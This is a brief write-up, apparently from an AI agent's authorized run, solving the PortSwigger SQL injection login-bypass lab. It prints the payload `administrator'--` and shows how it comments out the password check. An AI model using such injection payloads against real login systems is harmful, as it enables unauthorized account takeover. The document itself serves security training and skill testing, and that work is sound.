# case-01: SQLi login bypass (APPRENTICE) - PASS

- **Lab:** https://portswigger.net/web-security/sql-injection/lab-login-bypass
- **Skill path:** SKILL.md section 1 (logic subversion / auth bypass); note 01.
- **Date:** 2026-11-19, agent-run live (user-authorized PortSwigger exception).

## Steps
1. `POST /login` with username `administrator'--` and any password. The `--` comments out the password check: `... WHERE username = 'administrator'--' AND password = ''`.
2. Logged in as administrator (`/my-account?id=administrator`).

## Result
**Green banner: "LAB Solved"** (`.widgetcontainer-lab-status.is-solved`). No skill gap.
